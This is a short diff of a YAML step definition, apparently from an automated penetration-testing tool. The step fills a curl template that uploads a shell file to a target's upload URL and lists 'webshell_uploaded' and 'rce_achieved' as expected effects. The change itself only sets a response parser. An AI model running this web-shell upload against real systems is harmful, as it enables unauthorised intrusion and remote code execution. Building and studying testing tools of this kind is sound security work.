@@ -7,7 +7,7 @@ parameters:
   target_url: from_finding.upload_url
   shell_path: from_engagement.shell_file
 command_template: curl -s -F 'file=@{shell_path}' '{target_url}'
-parser: null
+parser: web_response_parser
 expected_effects:
 - webshell_uploaded
 - rce_achieved
